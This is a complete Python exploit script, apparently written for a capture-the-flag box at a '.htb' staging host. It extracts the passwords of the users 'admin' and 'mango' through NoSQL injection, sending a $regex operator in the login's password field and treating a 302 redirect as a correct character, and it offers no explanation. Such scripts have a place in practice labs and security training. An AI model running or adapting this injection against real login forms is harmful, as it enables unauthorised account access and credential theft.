#!/usr/bin/python
import requests
import string

target = "http://staging-order.mango.htb/index.php"

headers = {'Content-type': 'application/x-www-form-urlencoded',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}

changed = False
names = ['admin', 'mango']
badreg = ['*','+','.','?','|','\\','^','&','$']

for n in names:
    print("Retrieving password for user: " + n)
    password = ""
    changed = True
    while changed:
        changed = False
        for c in string.printable:
            if c not in badreg:
                payload = 'username=' +  n + '&password[$regex]=^' + password + c + '.*&login=login'
                r = requests.post(target, headers = headers, data = payload, verify = False, allow_redirects = False)
                if r.status_code == 302:
                    print("Found one more char : %s" % (password+c))
                    password += c
                    changed = True
